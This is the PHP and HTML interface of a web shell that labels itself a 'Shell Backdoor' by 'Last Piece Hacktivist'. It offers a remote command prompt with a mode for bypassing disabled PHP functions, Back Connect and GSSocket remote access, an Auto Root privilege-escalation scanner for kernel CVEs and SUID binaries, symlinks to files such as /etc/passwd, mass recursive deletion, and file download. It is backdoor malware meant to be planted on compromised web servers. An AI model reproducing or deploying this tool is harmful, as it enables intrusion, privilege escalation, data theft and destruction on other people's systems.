        <button onclick="showMassDeleteModal()" class="btn btn-sm" style="border-color: #f85149; color: #f85149;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
            Mass Delete
        </button>
    </div>

    <!-- Toolbar: Tools -->
    <div class="toolbar">
        <div class="toolbar-label">Tools</div>
        <button onclick="showModal('gsocket')" class="btn btn-gs btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
            GSSocket
        </button>
        <button onclick="showModal('uapi')" class="btn btn-uapi btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
            UAPI
        </button>
        <button onclick="showModal('ftp')" class="btn btn-ftp btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
            FTP Manager
        </button>
        <?php if ($wpAvailable): ?>
        <button onclick="showModal('wp')" class="btn btn-wp btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
            WordPress
        </button>
        <?php endif; ?>
        <button onclick="showModal('proc')" class="btn btn-proc btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/><line x1="9" y1="15" x2="9.01" y2="15"/><line x1="15" y1="15" x2="15.01" y2="15"/></svg>
            Process
        </button>
        <button onclick="showModal('cron')" class="btn btn-cron btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
            Cronjob
        </button>
        <button onclick="showSymlinkModal()" class="btn btn-sm" style="border-color: #a78bfa; color: #a78bfa;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
            Symlink
        </button>
        <button onclick="showBackconnectModal()" class="btn btn-sm" style="border-color: #ef4444; color: #ef4444;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
            Back Connect
        </button>
        <button onclick="showAutoRootModal()" class="btn btn-sm" style="border-color: #f59e0b; color: #f59e0b;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
            Auto Root
        </button>
    </div>

    <!-- Command -->
    <div class="cmd-section">
        <form method="POST" id="cmdForm">
            <input type="hidden" name="use_bypass" id="useBypassField" value="0">
            <div class="cmd-prompt">
                <span class="cmd-user"><?php echo @get_current_user() . '@' . @gethostname(); ?></span>
                <span class="cmd-dollar" id="cmdModeLabel">$</span>
                <input type="text" name="cmd" placeholder="Enter command..." autofocus>
                <button type="submit" class="btn btn-sm btn-primary">Run</button>
                <button type="button" id="bypassToggle" class="btn btn-sm btn-secondary" onclick="toggleBypass()" title="Toggle Bypass Mode" style="padding: 4px 8px; font-size: 10px; min-width: 52px;">Normal</button>
            </div>
        </form>
        <?php
        $disabledFuncs = @ini_get('disable_functions');
        $execAvailable = !$disabledFuncs || (
            stripos($disabledFuncs, 'exec') === false &&
            stripos($disabledFuncs, 'shell_exec') === false &&
            stripos($disabledFuncs, 'proc_open') === false &&
            stripos($disabledFuncs, 'system') === false
        );
        ?>
        <div style="display: flex; gap: 8px; align-items: center; margin-top: 6px; padding: 0 8px;">
            <span style="font-size: 10px; color: var(--text-muted);">Exec:</span>
            <span style="font-size: 10px; color: <?php echo $execAvailable ? '#3fb950' : '#f85149'; ?>;"><?php echo $execAvailable ? 'Available' : 'Disabled'; ?></span>
            <span style="font-size: 10px; color: var(--text-muted);">|</span>
            <span style="font-size: 10px; color: var(--text-muted);">Bypass:</span>
            <span style="font-size: 10px; color: #00d4ff;">UAF PHP <?php echo PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION; ?></span>
            <span style="font-size: 10px; color: var(--text-muted);">|</span>
            <span style="font-size: 10px; color: var(--text-muted);">Disabled:</span>
            <span style="font-size: 10px; color: #f97316; max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="<?php echo htmlspecialchars($disabledFuncs); ?>"><?php echo $disabledFuncs ? htmlspecialchars(substr($disabledFuncs, 0, 60)) . (strlen($disabledFuncs) > 60 ? '...' : '') : 'None'; ?></span>
        </div>
        <?php if (!empty($cmdOutput)): ?>
        <div class="cmd-output"><pre><?php echo htmlspecialchars($cmdOutput); ?></pre></div>
        <?php endif; ?>
    </div>

    <!-- Bulk Action Bar -->
    <div id="bulkBar" style="display:none; background: rgba(0,212,255,0.08); border: 1px solid rgba(0,212,255,0.25); border-radius: 8px; padding: 8px 14px; margin-bottom: 8px; display: none; align-items: center; gap: 10px; flex-wrap: wrap;">
        <span style="font-size: 11px; color: #00d4ff; font-weight: 600;"><span id="bulkCount">0</span> selected</span>
        <button class="btn btn-sm btn-primary" onclick="bulkAction('download')" style="font-size: 10px; padding: 3px 10px;">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:3px;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download
        </button>
        <button class="btn btn-sm" onclick="bulkAction('zip')" style="font-size: 10px; padding: 3px 10px; border-color: #f97316; color: #f97316;">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:3px;"><path d="M21 8v13H3V8"/><path d="M1 3h22v5H1z"/><path d="M10 12h4"/></svg>Compress ZIP
        </button>
        <button class="btn btn-sm" onclick="bulkAction('delete')" style="font-size: 10px; padding: 3px 10px; border-color: #f85149; color: #f85149;">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:3px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>Delete
        </button>
        <button class="btn btn-sm btn-secondary" onclick="clearSelection()" style="font-size: 10px; padding: 3px 10px;">Clear</button>
    </div>

    <!-- File Table -->
    <table class="file-table">
        <tr>
            <th style="width: 30px; text-align: center;"><input type="checkbox" id="selectAllFiles" onchange="toggleSelectAll(this)" style="accent-color: var(--gold);"></th>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Permission</th>
            <th>Actions</th>
        </tr>
        <?php
        $fileDetails = getFileDetails($currentDirectory);
        if (is_array($fileDetails)):
            foreach ($fileDetails as $fd):
                $fullPath = $currentDirectory . '/' . $fd['name'];
                $isSymlink = is_link($fullPath);
                $symlinkTarget = $isSymlink ? @readlink($fullPath) : '';
        ?>
        <tr>
            <td style="text-align: center;"><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($fullPath); ?>" onchange="updateBulkBar()" style="accent-color: var(--gold);"></td>
            <td>
                <span class="file-icon">
                    <?php if ($isSymlink): ?>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                    <?php if ($fd['type'] === 'Folder'): ?>
                    <a href="?lph=<?php echo urlencode($fullPath); ?>&lastpiece=hacktivist" style="color: #a78bfa;"><?php echo htmlspecialchars($fd['name']); ?></a>
                    <?php else: ?>
                    <a href="javascript:void(0)" onclick="showEditModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>')" style="color: #a78bfa;"><?php echo htmlspecialchars($fd['name']); ?></a>
                    <?php endif; ?>
                    <span style="color: var(--text-muted); font-size: 10px; margin-left: 4px;" title="<?php echo htmlspecialchars($symlinkTarget); ?>">-> <?php echo htmlspecialchars(strlen($symlinkTarget) > 40 ? '...' . substr($symlinkTarget, -37) : $symlinkTarget); ?></span>
                    <?php elseif ($fd['type'] === 'Folder'): ?>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="var(--gold)" stroke="var(--gold)" stroke-width="1"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                    <a href="?lph=<?php echo urlencode($fullPath); ?>&lastpiece=hacktivist" style="color: var(--gold);"><?php echo htmlspecialchars($fd['name']); ?></a>
                    <?php else: ?>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#e6edf3" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                    <a href="javascript:void(0)" onclick="showEditModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>')" style="color: #e6edf3;"><?php echo htmlspecialchars($fd['name']); ?></a>
                    <?php endif; ?>
                </span>
            </td>
            <td style="color: <?php echo $isSymlink ? '#a78bfa' : '#00d4ff'; ?>;"><?php echo $isSymlink ? 'Symlink' : $fd['type']; ?></td>
            <td><?php echo $fd['size']; ?></td>
            <td style="color: <?php echo $fd['perm_color']; ?>; font-family: monospace; font-weight: 600;"><?php echo $fd['permission']; ?></td>
            <td>
                <div class="action-btns">
                    <?php if ($fd['type'] === 'File'): ?>
                    <a href="javascript:void(0)" onclick="showEditModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>')">Edit</a>
                    <a href="?dl=<?php echo urlencode($fullPath); ?>&lastpiece=hacktivist" title="Download">DL</a>
                    <?php endif; ?>
                    <a href="javascript:void(0)" onclick="showRenameModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>')">Rename</a>
                    <a href="javascript:void(0)" onclick="showChmodModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>','<?php echo $fd['permission']; ?>')">Chmod</a>
                    <a href="javascript:void(0)" class="act-del" onclick="showDeleteConfirm('<?php echo urlencode($fullPath); ?>','<?php echo htmlspecialchars($fd['name']); ?>')">Delete</a>
                </div>
            </td>
        </tr>
        <?php endforeach; else: ?>
        <tr><td colspan="6" style="color:var(--text-muted);">No files or folders found.</td></tr>
        <?php endif; ?>
    </table>
</div>

<footer class="app-footer">
    <div class="footer-content">
        <img src="https://i.top4top.io/p_3332p3mbq1.jpg" class="footer-avatar" alt="">
        <div class="footer-text"><span>Last Piece Hacktivist</span> Shell Backdoor v1.2.4</div>
    </div>
</footer>

<!-- Delete Confirm Modal -->
<div class="modal-overlay hidden" id="deleteConfirmModal">
    <div class="modal" style="max-width: 400px;">
        <div class="modal-header" style="border-bottom-color: rgba(248, 81, 73, 0.3);">
            <span class="modal-title" style="color: var(--red);">Delete Confirmation</span>
            <button class="modal-close" onclick="hideDeleteConfirm()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="text-align: center; padding: 24px;">
            <div style="width: 60px; height: 60px; background: rgba(248, 81, 73, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
            </div>
            <p style="color: var(--text); font-size: 14px; margin-bottom: 8px;">Are you sure?</p>
            <p id="deleteFileName" style="color: var(--gold); font-size: 13px; font-weight: 600; word-break: break-all;"></p>
            <p style="color: var(--text-muted); font-size: 11px; margin-top: 12px;">This action cannot be undone.</p>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button type="button" class="btn btn-secondary" onclick="hideDeleteConfirm()">Cancel</button>
            <a id="deleteConfirmBtn" href="#" class="btn btn-danger" style="background: var(--red); color: white;">Delete</a>
        </div>
    </div>
</div>

<!-- Symlink Modal -->
<div class="modal-overlay hidden" id="symlinkModal">
    <div class="modal" style="max-width: 480px;">
        <div class="modal-header" style="border-bottom-color: rgba(167, 139, 250, 0.3);">
            <span class="modal-title" style="color: #a78bfa;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                Create Symlink
            </span>
            <button class="modal-close" onclick="hideModal2('symlinkModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 20px;">
            <div style="width: 50px; height: 50px; background: rgba(167,139,250,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
            </div>
            <p style="color: var(--text-muted); font-size: 11px; text-align: center; margin-bottom: 4px;">Create in:</p>
            <p style="color: #00d4ff; font-size: 11px; text-align: center; margin-bottom: 16px; word-break: break-all; font-family: monospace;"><?php echo htmlspecialchars($currentDirectory); ?></p>
            <div class="form-group" style="margin-bottom: 12px;">
                <label class="form-label">Target Path <span style="color: var(--text-muted); font-weight: 400;">(file or directory to link to)</span></label>
                <input type="text" id="symlinkTarget" class="form-input" placeholder="e.g. /var/www/html/public or /etc/passwd">
            </div>
            <div class="form-group" style="margin-bottom: 0;">
                <label class="form-label">Link Name <span style="color: var(--text-muted); font-weight: 400;">(name of the symlink)</span></label>
                <input type="text" id="symlinkName" class="form-input" placeholder="e.g. link_to_public">
            </div>
            <div style="background: rgba(167,139,250,0.06); border: 1px solid rgba(167,139,250,0.15); border-radius: 6px; padding: 8px 10px; margin-top: 14px;">
                <p style="color: #a78bfa; font-size: 10px; font-family: monospace;" id="symlinkPreview">symlink: link_name -> /target/path</p>
            </div>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button class="btn btn-secondary" onclick="hideModal2('symlinkModal')">Cancel</button>
            <button class="btn" style="background: #a78bfa; border-color: #a78bfa; color: #fff; font-weight: 600;" onclick="doCreateSymlink()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                Create Symlink
            </button>
        </div>
    </div>
</div>

<!-- Create Folder Modal -->
<div class="modal-overlay hidden" id="createFolderModal">
    <div class="modal" style="max-width: 420px;">
        <div class="modal-header" style="border-bottom-color: rgba(255, 215, 0, 0.3);">
            <span class="modal-title" style="color: var(--gold);">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
                Create New Folder
            </span>
            <button class="modal-close" onclick="hideModal2('createFolderModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 20px;">
            <div style="width: 50px; height: 50px; background: rgba(255,215,0,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="var(--gold)" stroke="var(--gold)" stroke-width="1"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
            </div>
            <p style="color: var(--text-muted); font-size: 11px; text-align: center; margin-bottom: 4px;">Current directory:</p>
            <p style="color: #00d4ff; font-size: 11px; text-align: center; margin-bottom: 16px; word-break: break-all; font-family: monospace;"><?php echo htmlspecialchars($currentDirectory); ?></p>
            <div class="form-group" style="margin-bottom: 0;">
                <label class="form-label">Folder Name</label>
                <input type="text" id="newFolderName" class="form-input" placeholder="e.g. my-folder" required>
            </div>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button class="btn btn-secondary" onclick="hideModal2('createFolderModal')">Cancel</button>
            <button class="btn btn-primary" onclick="doCreateFolder()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="20 6 9 17 4 12"/></svg>
                Create
            </button>
        </div>
    </div>
</div>

<!-- Create File Modal -->
<div class="modal-overlay hidden" id="createFileModal">
    <div class="modal" style="max-width: 650px; max-height: 90vh;">
        <div class="modal-header" style="border-bottom-color: rgba(0, 212, 255, 0.3);">
            <span class="modal-title" style="color: #00d4ff;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
                Create New File
            </span>
            <button class="modal-close" onclick="hideModal2('createFileModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 16px;">
            <p style="color: var(--text-muted); font-size: 11px; margin-bottom: 4px;">Create in: <span style="color: #00d4ff; font-family: monospace;"><?php echo htmlspecialchars($currentDirectory); ?></span></p>
            <div class="form-group" style="margin-bottom: 10px; margin-top: 12px;">
                <label class="form-label">File Name</label>
                <input type="text" id="newFileName" class="form-input" placeholder="e.g. index.php, config.txt, style.css">
            </div>
            <div class="form-group" style="margin-bottom: 0;">
                <label class="form-label">Content <span style="color: var(--text-muted); font-weight: 400;">(optional - leave empty for blank file)</span></label>
                <textarea id="newFileContent" class="editor-area" style="width:100%;height:30vh;font-family:monospace;font-size:12px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:10px;resize:vertical;tab-size:4;" placeholder="File content here... (optional)"></textarea>
            </div>
        </div>
        <div class="modal-footer" style="justify-content: flex-end; gap: 8px;">
            <button class="btn btn-secondary" onclick="hideModal2('createFileModal')">Cancel</button>
            <button class="btn btn-primary" onclick="doCreateFile()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="20 6 9 17 4 12"/></svg>
                Save File
            </button>
        </div>
    </div>
</div>

<!-- Mass Delete Recursive Modal -->
<div class="modal-overlay hidden" id="massDeleteModal">
    <div class="modal" style="max-width: 550px;">
        <div class="modal-header" style="border-bottom-color: rgba(248, 81, 73, 0.3);">
            <span class="modal-title" style="color: #f85149;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                Mass Delete Recursive
            </span>
            <button class="modal-close" onclick="hideModal2('massDeleteModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 16px;">
            <div style="background: rgba(248,81,73,0.08); border: 1px solid rgba(248,81,73,0.2); border-radius: 6px; padding: 10px; margin-bottom: 14px;">
                <p style="color: #f85149; font-size: 11px; font-weight: 600;">WARNING: This will recursively scan and delete files. Use with extreme caution!</p>
            </div>
            <div class="form-group" style="margin-bottom: 10px;">
                <label class="form-label">Target Directory</label>
                <input type="text" id="massDelDir" class="form-input" value="<?php echo htmlspecialchars($currentDirectory); ?>">
            </div>
            <div class="form-group" style="margin-bottom: 10px;">
                <label class="form-label">Mode</label>
                <select id="massDelMode" class="form-input" onchange="toggleMassDelCode()">
                    <option value="code">Delete files containing specific code/text</option>
                    <option value="all">Delete ALL files recursively (DANGER)</option>
                </select>
            </div>
            <div class="form-group" id="massDelCodeGroup" style="margin-bottom: 0;">
                <label class="form-label">Code/Text to Match <span style="color: var(--text-muted); font-weight: 400;">(paste sample or full code)</span></label>
                <textarea id="massDelCode" class="editor-area" style="width:100%;height:15vh;font-family:monospace;font-size:11px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:10px;resize:vertical;" placeholder="Paste malicious code signature here...&#10;e.g. eval(base64_decode(&#10;or any unique string to match"></textarea>
            </div>
            <div id="massDelResult" style="display:none; margin-top: 10px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px; padding: 10px; font-size: 11px; font-family: monospace;"></div>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button class="btn btn-secondary" onclick="hideModal2('massDeleteModal')">Cancel</button>
            <button class="btn" id="massDelBtn" style="background: #f85149; border-color: #f85149; color: #fff; font-weight: 600;" onclick="doMassDeleteRecursive()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                Execute Delete
            </button>
        </div>
    </div>
</div>

<!-- Bulk Compress Name Modal -->
<div class="modal-overlay hidden" id="zipNameModal">
    <div class="modal" style="max-width: 380px;">
        <div class="modal-header" style="border-bottom-color: rgba(249, 115, 22, 0.3);">
            <span class="modal-title" style="color: #f97316;">Compress to ZIP</span>
            <button class="modal-close" onclick="hideModal2('zipNameModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 20px;">
            <div class="form-group" style="margin-bottom: 0;">
                <label class="form-label">ZIP Filename</label>
                <input type="text" id="zipFileName" class="form-input" value="archive.zip" placeholder="archive.zip">
            </div>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button class="btn btn-secondary" onclick="hideModal2('zipNameModal')">Cancel</button>
            <button class="btn" style="background: #f97316; border-color: #f97316; color: #fff; font-weight: 600;" onclick="doCompressZip()">Compress</button>
        </div>
    </div>
</div>

<!-- Auto Root Modal -->
<div class="modal-overlay hidden" id="autoRootModal">
    <div class="modal" style="max-width: 680px; max-height: 90vh;">
        <div class="modal-header" style="border-bottom-color: rgba(245, 158, 11, 0.3);">
            <span class="modal-title" style="color: #f59e0b;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                Auto Root - Privilege Escalation
            </span>
            <button class="modal-close" onclick="hideModal2('autoRootModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 16px; overflow-y: auto; max-height: calc(90vh - 120px);">
            <!-- System Info Panel -->
            <div id="arSysInfo" style="background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 12px; margin-bottom: 14px;">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
                    <span style="font-size:12px;font-weight:600;color:#f59e0b;">System Information</span>
                    <span id="arStatus" style="font-size:10px;color:var(--text-muted);">Click Scan to detect kernel</span>
                </div>
                <div id="arInfoGrid" style="display:grid;grid-template-columns:1fr 1fr;gap:6px;font-size:10px;">
                    <div><span style="color:var(--text-muted);">Kernel:</span> <span id="arKernel" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">Arch:</span> <span id="arArch" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">User:</span> <span id="arUser" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">UID:</span> <span id="arUid" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">GCC:</span> <span id="arGcc" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">Writable:</span> <span id="arWritable" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">Sudo:</span> <span id="arSudo" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">Docker:</span> <span id="arDocker" style="color:#00d4ff;">-</span></div>
                </div>
                <div style="margin-top:8px;"><span style="color:var(--text-muted);font-size:10px;">OS:</span> <span id="arOs" style="color:var(--text-secondary);font-size:10px;font-family:monospace;">-</span></div>
            </div>

            <!-- Scan Button -->
            <div style="text-align:center;margin-bottom:14px;">
                <button class="btn" id="arScanBtn" style="background:#f59e0b;border-color:#f59e0b;color:#000;font-weight:700;padding:8px 28px;" onclick="doAutoRootScan()">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
                    Scan Kernel & Detect CVE
                </button>
            </div>

            <!-- CVE Results -->
            <div id="arExploitList" style="display:none;">
                <div style="font-size:12px;font-weight:600;color:#f59e0b;margin-bottom:8px;">
                    Detected Exploits <span id="arExploitCount" style="background:rgba(245,158,11,0.15);color:#f59e0b;padding:2px 8px;border-radius:10px;font-size:10px;margin-left:6px;">0</span>
                </div>
                <div id="arExploits" style="display:flex;flex-direction:column;gap:8px;"></div>
            </div>

            <!-- SUID Results -->
            <div id="arSuidList" style="display:none;margin-top:14px;">
                <div style="font-size:12px;font-weight:600;color:#a78bfa;margin-bottom:8px;">
                    SUID Binaries (exploitable) <span id="arSuidCount" style="background:rgba(167,139,250,0.15);color:#a78bfa;padding:2px 8px;border-radius:10px;font-size:10px;margin-left:6px;">0</span>
                </div>
                <div id="arSuids" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
            </div>

            <!-- Custom Exploit -->
            <div style="margin-top:14px;padding-top:14px;border-top:1px solid var(--border);">
                <div style="font-size:11px;font-weight:600;color:var(--text-secondary);margin-bottom:8px;">Custom Exploit Command</div>
                <div style="display:flex;gap:8px;">
                    <input type="text" id="arCustomCmd" class="form-input" placeholder="e.g. /tmp/exploit or custom command..." style="flex:1;font-family:monospace;font-size:11px;">
